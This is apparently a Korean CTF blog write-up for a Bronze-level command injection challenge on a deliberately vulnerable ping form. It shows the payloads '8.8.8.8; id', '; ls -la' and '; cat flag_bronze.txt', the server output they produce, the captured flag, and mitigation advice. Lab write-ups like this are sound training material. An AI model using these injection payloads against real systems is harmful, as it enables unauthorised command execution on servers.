+++
title = "VulnABLE CTF [LUXORA]: Command Injection 🥉 Bronze (Basic Shell Execution)"
description = "LUXORA 플랫폼의 기본 Command Injection 플래그 획득 시나리오 및 명령어 체이닝 원리 분석"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Bronze", "OS Command"]
+++

# VulnABLE CTF [LUXORA]: Command Injection 🥉 Bronze

Command Injection(OS 명령어 삽입)은 웹 애플리케이션의 입력을 통해 백엔드 서버의 운영체제(OS) 쉘(Shell)에 직접 명령어를 주입하는 가장 파괴적인 취약점 중 하나입니다.

이번 시나리오에서는 `/cmdi/bronze` 라우트에 있는 기본적인 네트워크 도구(Ping) 기능에서 발생하는 취약점을 공략해보겠습니다.

---

## 🕒 1. 타겟 탐색 및 기능 분석 (Reconnaissance)

`/cmdi/bronze` 페이지는 사용자가 입력한 IP 주소로 `ping` 테스트를 수행해주는 진단 페이지입니다.
입력창에 `8.8.8.8`을 입력하고 [Test] 버튼을 누릅니다.

**[정상 응답 확인]**
```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=13.8 ms
...
```

**[해커의 사고 과정]**
* 이 결과물은 리눅스의 실제 `ping` 명령어 출력물과 완벽히 동일하다.
* 백엔드(Node.js)에서 `child_process.exec("ping -c 4 " + req.body.ip)` 처럼 쉘을 통해 직접 명령어를 실행하고 있을 확률이 99%다.
* 리눅스 쉘의 **명령어 구분자(Command Separator)**를 이용하면 내 마음대로 다음 명령어를 실행할 수 있을 것이다!

---

## 🕒 2. 취약점 식별 및 메타문자 주입 (Exploitation)

리눅스와 윈도우 쉘에서는 여러 명령어를 한 줄에 실행하기 위해 특수 기호(메타문자)를 사용합니다.

* `;` (세미콜론): 앞 명령어 끝내고 무조건 뒤 명령어 실행
* `&&` (AND): 앞 명령어가 성공해야 뒤 명령어 실행
* `||` (OR): 앞 명령어가 실패해야 뒤 명령어 실행
* `|` (Pipe): 앞 명령어의 결과를 뒤 명령어의 입력으로 전달

### 💡 공격 원리: 명령어 이어붙이기 (Chaining)
IP 입력창에 `8.8.8.8; id` 라고 입력해봅니다.

서버가 실행하는 최종 명령어:
`ping -c 4 8.8.8.8; id`

이 명령어는 핑을 먼저 4번 치고 난 후, 곧바로 해커가 주입한 `id` 명령어(현재 사용자 권한 확인)를 실행하게 됩니다.

---

## 🕒 3. 플래그 탐색 및 획득 🚩

위 페이로드를 전송한 결과, 화면 하단에 다음과 같이 출력되었습니다.

```text
PING 8.8.8.8...
(핑 결과 생략)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

명령어 실행에 성공했습니다! 이제 서버 내부를 탐색하여 플래그를 찾습니다.

```http
# 디렉터리 목록 확인
POST /cmdi/bronze
ip=8.8.8.8; ls -la
```

응답에 `flag_bronze.txt` 파일이 보입니다.

```http
# 플래그 내용 읽기
POST /cmdi/bronze
ip=8.8.8.8; cat flag_bronze.txt
```

### 🔍 공격 결과
화면에 플래그 내용이 노출됩니다.
```text
FLAG{CMDI_🥉_BASIC_EXEC_D4E5F6}
```

**플래그 획득:** `FLAG{CMDI_🥉_BASIC_EXEC_D4E5F6}`

---

## 🛡️ 방어 대책 (Mitigation)

Command Injection은 시스템을 즉시 장악당할 수 있는 치명적 결함입니다.
1. **OS 명령어 호출 지양**: `exec`나 `system` 같은 함수를 써서 외부 명령어를 직접 호출하는 것을 최대한 피하고, 언어 자체에서 제공하는 내장 API(예: DNS 룩업 패키지, 소켓 등)를 사용해야 합니다.
2. **파라미터화된 실행 함수 사용**: 불가피하게 명령어를 실행해야 한다면, 쉘 인터프리터를 거치지 않는 함수(`execFile`, `spawn` 등)를 사용하여 입력값이 인자(Argument)로만 전달되게 강제해야 합니다.
3. **엄격한 화이트리스트 검증**: 위 사례처럼 IP를 입력받는다면, 입력값이 정확히 IPv4 형식(숫자와 점)에만 부합하는지 강력한 정규식으로 걸러내야 합니다.

다음 단계인 **Silver 🥈 난이도**에서는 띄어쓰기(공백)와 세미콜론이 막혔을 때 어떻게 명령어를 우회하여 삽입하는지 알아보겠습니다!